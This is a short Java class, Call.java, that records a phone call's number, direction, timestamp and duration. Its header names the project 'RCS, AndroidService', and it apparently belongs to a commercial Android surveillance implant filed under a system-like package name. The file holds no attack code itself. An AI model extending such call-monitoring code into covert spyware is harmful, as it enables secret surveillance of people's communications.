/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Call.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking;

import java.util.Date;

public class Call {
	private static final String TAG = "Call"; //$NON-NLS-1$

	private final String number;
	private final boolean incoming, ongoing;
	private boolean complete;
	private final Date timestamp;

	public final static boolean INCOMING = true;
	public final static boolean OUTGOING = false;
	public final static boolean START = true;
	public final static boolean END = false;

	public Call(String number, boolean incoming, boolean ongoing) {
		this.number = number;
		this.incoming = incoming;
		this.ongoing = ongoing;
		this.timestamp = new Date();
		this.complete = false;
	}

	public String getNumber() {
		return number;
	}

	public boolean isIncoming() {
		return incoming;
	}

	public boolean isOngoing() {
		return ongoing;
	}

	public Date getTimestamp() {
		return timestamp;
	}
	
	public boolean isComplete() {
		return complete;
	}
	
	public void setComplete() {
		complete = true;
	}

	/**
	 * Get the call duration in seconds elapsed between lastCall (older) and
	 * this call,
	 * 
	 * @param callInAction
	 * @return
	 */
	public int getDuration(Call lastCall) {
		final long duration = timestamp.getTime() - lastCall.getTimestamp().getTime();
		return (int) (duration / 1000);
	}

	@Override
	public String toString() {
		return number
				+ Messages.getString("28.1") + ongoing + Messages.getString("28.0") + incoming + " " + timestamp; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
	}
}
